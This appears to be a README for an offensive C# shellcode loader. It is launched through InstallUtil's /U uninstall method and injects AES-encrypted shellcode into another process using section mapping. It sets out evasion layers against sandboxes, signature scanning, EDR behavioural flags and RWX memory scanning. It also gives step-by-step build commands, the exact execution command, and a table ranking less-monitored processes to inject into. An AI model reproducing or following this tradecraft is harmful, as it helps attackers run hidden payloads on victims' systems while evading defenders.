# Section-Injection Loader

InstallUtil-compatible C# loader that performs **section-based process injection** with **RW→RX memory transitions** and **AES-encrypted shellcode**. No PowerShell dependency — zero AMSI exposure.

## Evasion layers

| Layer | Technique | What it evades |
|-------|-----------|----------------|
| Sandbox checks | FLS callback + Sleep timing | Automated analysis environments |
| AES-256-CBC | Shellcode encrypted at build time | Static signature detection |
| Section injection | `NtCreateSection` + `NtMapViewOfSection` | `VirtualAllocEx` + `WriteProcessMemory` behavioral flags |
| RW→RX | Memory starts RW, flipped to RX before execution | RWX memory scanning |
| Target selection | RuntimeBroker.exe (default) | notepad.exe / explorer.exe monitoring |

## Build

### Step 1: Generate shellcode with Donut

```powershell
cd ..\..\shellcode-gen
.\donut-wrapper.ps1 -InputFile payload.exe -OutputFile shellcode.cs -Arch x64
```

Extract the byte array from `shellcode.cs` into a raw `.bin` file, or use:

```powershell
.\byte-array-converter.ps1 -InputFile shellcode.bin -OutputFile shellcode.cs
```

### Step 2: Encrypt the shellcode

```powershell
.\aes-encrypt-shellcode.ps1 -InputFile shellcode.bin -OutputFile aes_data.cs
```

### Step 3: Embed AES data in Loader.cs

Open `Loader.cs` and replace the three placeholder arrays:

- `AesKey` (32 bytes)
- `AesIV` (16 bytes)
- `EncryptedShellcode` (ciphertext)

with the values from `aes_data.cs`.

### Step 4: Compile

```batch
.\compile.bat
```

Output: `loader.exe`

## Execute

```batch
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /U loader.exe
```

The `/U` flag triggers the `Uninstall()` method, which is where the payload runs.

## Configuration

### Target process

Default: `RuntimeBroker.exe` (per-user, less monitored, always present on Windows 10/11).

Override via environment variable:

```batch
set INJ_TARGET=dllhost.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /U loader.exe
```

| Target | Notes |
|--------|-------|
| `RuntimeBroker.exe` | Per-user, less monitored, always present (default) |
| `dllhost.exe` | COM surrogate, always present, less monitored |
| `SearchIndexer.exe` | Low-traffic, less monitored |
| `svchost.exe` | Common in malware, but highly monitored |
| `notepad.exe` | Very heavily monitored — avoid |
| `explorer.exe` | Highly monitored |

## How it works

```
Uninstall(savedState)
  ├─ Sandbox checks (FLS + timing)
  ├─ AES decrypt embedded shellcode in memory
  ├─ OpenProcess(target, PROCESS_ALL_ACCESS)
  ├─ NtCreateSection(PAGE_READWRITE, SEC_COMMIT)
  ├─ NtMapViewOfSection(local, RW)  → write shellcode
  ├─ NtMapViewOfSection(remote, RW) → shared section in target
  ├─ NtUnmapViewOfSection(local) + NtClose(section)
  ├─ NtProtectVirtualMemory(remote, PAGE_EXECUTE_READ)  ← RW→RX flip
  └─ CreateRemoteThread(remote, RX)
```

## Requirements

- Windows 10/11 (x64)
- .NET Framework 4.x (ships with Windows)
- Target process must be running (RuntimeBroker.exe is always present)
